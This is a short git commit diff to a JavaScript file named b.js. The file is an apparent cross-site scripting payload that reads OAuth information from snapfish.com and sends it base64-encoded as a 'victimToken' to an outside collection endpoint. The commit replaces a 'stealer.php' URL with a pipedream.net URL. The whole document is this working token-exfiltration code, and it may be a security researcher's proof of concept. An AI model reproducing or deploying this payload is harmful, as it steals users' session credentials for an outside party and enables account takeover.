1d771e92ea9aa8c32c2c72c2f46539564c05494a
Márcio Cirqueira <62367006+mrccrqr@users.noreply.github.com>
2025-02-03 02:47:38 -0300

    Update b.js

--- b.js
+++ b.js
@@ -1,3 +1,3 @@
 fetch("https://www.snapfish.com/library/getOauthInfo")
   .then(r => r.text())
-  .then(d => fetch("https://marciosz.myartsonline.com/snapfish/fbxss/stealer.php?victimToken=" + btoa(d)));
+  .then(d => fetch("https://eo7zkmzf6wd8uno.m.pipedream.net?victimToken=" + btoa(d)));
